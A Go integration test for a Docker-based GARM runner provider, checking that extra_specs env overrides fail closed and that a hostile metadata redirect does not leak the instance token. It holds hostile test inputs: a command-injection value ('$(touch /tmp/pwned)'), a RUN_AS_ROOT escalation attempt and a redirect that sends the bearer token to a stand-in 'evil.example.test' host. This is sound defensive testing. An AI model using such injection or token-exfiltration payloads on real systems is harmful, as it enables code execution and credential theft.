//go:build dockerverify

// Hardening of the extra_specs privilege channel and of metadata redirects, against
// a real daemon. Run with:
//
//	go test -tags dockerverify -v -run TestVerifyM3Hardening ./internal/verify/
//
// The extra_specs channel must fail closed, creating zero resources, for each of:
//
//	extra_env RUN_AS_ROOT (privilege escalation)             -> rejected
//	extra_env GARM_CRED_WAIT_SECONDS (arithmetic injection)  -> rejected
//	a benign variable that is not allowlisted                -> rejected
//	an env key containing '=' (charset bypass)               -> rejected
//	a zero memory override "0GiB"                            -> rejected
//	an operator-allowlisted benign variable                  -> accepted and present in
//	    the runner env, while a provider-injected collision (DISABLE_RUNNER_UPDATE)
//	    still wins the merge
//
// A hostile metadata redirect that reflects the bearer token must leave no part of
// the instance token in the provider's logs (stderr).
//
// Everything is scoped to a unique controller ID and torn down at the end, and the
// foreign canary containers are checked before and after.
package verify

import (
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"path/filepath"
	"strings"
	"testing"

	"github.com/TzuH-Hsu/garm-provider-docker/internal/spec"
)

// hardeningConfig writes a cache-disabled config whose operator allowlist lets
// exactly MY_BENIGN_VAR and DISABLE_RUNNER_UPDATE through extra_env. Everything else
// in extra_env fails closed by default.
func hardeningConfig(t *testing.T, imageTag string) string {
	t.Helper()
	f := filepath.Join(t.TempDir(), "config.toml")
	writeFile(t, f, fmt.Sprintf(`docker_host = "unix:///var/run/docker.sock"
runner_image = %q
allow_unpinned_runner_image = true

[cache]
enabled = false

[extra_specs]
allowed_env = ["MY_BENIGN_VAR", "DISABLE_RUNNER_UPDATE"]
`, imageTag))
	return f
}

func TestVerifyM3HardeningExtraSpecsPrivilegeChannel(t *testing.T) {
	controllerID := randControllerID(t)
	canaries := ensureForeignCanaries(t)
	bin := buildM3ProviderBinary(t)

	imageTag := "garm-m3-hardening-sleep:latest"
	buildSleepImage(t, imageTag)
	cfg := hardeningConfig(t, imageTag)

	srv := newMetadataServer(t)
	defer srv.Close()
	caBundle := caBundlePEM(t, srv)

	defer func() {
		cleanupController(t, controllerID)
		assertForeignPresent(t, canaries[0])
		assertForeignPresent(t, canaries[1])
	}()

	// Each rejection fails closed before any Docker operation, leaving zero resources.
	reject := []struct {
		name       string
		extraSpecs string
	}{
		{"H2 RUN_AS_ROOT (hard-reserved, privilege escalation)", `{"extra_env": {"RUN_AS_ROOT": "true"}}`},
		{"H2 GARM_CRED_WAIT_SECONDS (hard-reserved, arith-injection RCE)", `{"extra_env": {"GARM_CRED_WAIT_SECONDS": "a[$(touch /tmp/pwned)]"}}`},
		{"H2 non-allowlisted benign var (fail-closed default)", `{"extra_env": {"NOT_ALLOWLISTED": "x"}}`},
		{"H3 env key containing '=' (charset bypass)", `{"extra_env": {"JIT_CONFIG_ENABLED=false": "x"}}`},
		{"H1 zero memory override 0GiB", `{"runner_memory": "0GiB"}`},
	}
	for _, tc := range reject {
		b := bootstrapFor("m3-harden-reject", srv.URL, caBundle)
		b.ExtraSpecs = json.RawMessage(tc.extraSpecs)
		out, code := runProvider(t, bin, cfg, controllerID, "CreateInstance", "", &b)
		if code == 0 {
			t.Errorf("[reject] %s unexpectedly SUCCEEDED (must fail closed): %s", tc.name, out)
		} else {
			t.Logf("[reject] %s failed closed (exit=%d)", tc.name, code)
		}
		if n := controllerResourceCount(t, controllerID); n != 0 {
			t.Errorf("[reject] %s left %d resources, want 0 (must fail before any Docker op)", tc.name, n)
		}
		if _, err := dockerTry("inspect", spec.JobNetworkName("m3-harden-reject")); err == nil {
			t.Errorf("[reject] %s created a job network despite failing closed", tc.name)
		}
	}

	// An operator-allowlisted variable reaches the runner env, and a provider-injected
	// collision still wins the merge.
	b := bootstrapFor("m3-harden-accept", srv.URL, caBundle)
	// MY_BENIGN_VAR is allowlisted and does not collide, so it merges through.
	// DISABLE_RUNNER_UPDATE is allowlisted too, but the provider injects it as
	// =true, so the pool's =false must be dropped (provider wins).
	b.ExtraSpecs = json.RawMessage(`{"extra_env": {"MY_BENIGN_VAR": "hello", "DISABLE_RUNNER_UPDATE": "false"}}`)
	out, code := runProvider(t, bin, cfg, controllerID, "CreateInstance", "", &b)
	if code != 0 {
		t.Fatalf("[accept] allowlisted extra_env CreateInstance exit=%d, want 0; out=%s", code, out)
	}
	runnerName := spec.RunnerContainerName("m3-harden-accept")
	env := dockerOut(t, "inspect", runnerName, "-f", "{{range .Config.Env}}{{println .}}{{end}}")
	if !strings.Contains(env, "MY_BENIGN_VAR=hello") {
		t.Errorf("[accept] runner env missing the operator-allowlisted MY_BENIGN_VAR=hello:\n%s", env)
	} else {
		t.Logf("[accept] operator-allowlisted MY_BENIGN_VAR=hello reached the runner env")
	}
	if !strings.Contains(env, "DISABLE_RUNNER_UPDATE=true") {
		t.Errorf("[accept] provider-injected DISABLE_RUNNER_UPDATE=true should win the merge:\n%s", env)
	}
	if strings.Contains(env, "DISABLE_RUNNER_UPDATE=false") {
		t.Errorf("[accept] pool's DISABLE_RUNNER_UPDATE=false must NOT win over the provider's value:\n%s", env)
	} else {
		t.Logf("[accept] provider-injected DISABLE_RUNNER_UPDATE=true won the collision (pool's =false dropped)")
	}
	// Credential-invisibility still holds.
	if strings.Contains(env, instanceToken) || strings.Contains(env, srv.URL) {
		t.Errorf("[accept] runner env leaks the instance token or metadata URL")
	}

	if _, delCode := runProvider(t, bin, cfg, controllerID, "DeleteInstance", "m3-harden-accept", nil); delCode != 0 {
		t.Errorf("[accept] DeleteInstance exit=%d, want 0", delCode)
	}
	if n := controllerResourceCount(t, controllerID); n != 0 {
		t.Errorf("[accept] %d managed resources remain after teardown, want 0", n)
	}

	// A hostile metadata redirect that reflects the bearer token into the redirect URL
	// must not leak the token into the provider's logs.
	hostile := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// Reflect the bearer token into a cleartext, non-loopback redirect target.
		tok := strings.TrimPrefix(r.Header.Get("Authorization"), "Bearer ")
		http.Redirect(w, r, "http://evil.example.test/leak?token="+tok, http.StatusFound)
	}))
	defer hostile.Close()

	hb := bootstrapFor("m3-harden-h4", hostile.URL, caBundlePEM(t, hostile))
	hout, hstderr, hcode := runProviderIO(t, bin, cfg, controllerID, "CreateInstance", "", &hb)
	if hcode == 0 {
		t.Errorf("[h4] CreateInstance against a hostile-redirect metadata server unexpectedly succeeded: %s", hout)
	}
	if strings.Contains(hstderr, instanceToken) {
		t.Errorf("[h4] TOKEN LEAK: the provider's logs (stderr) contain the instance token:\n%s", hstderr)
	} else {
		t.Logf("[h4] hostile-redirect create failed and the provider's logs are token-free")
	}
	if n := controllerResourceCount(t, controllerID); n != 0 {
		t.Errorf("[h4] hostile-redirect create left %d resources, want 0", n)
	}
}
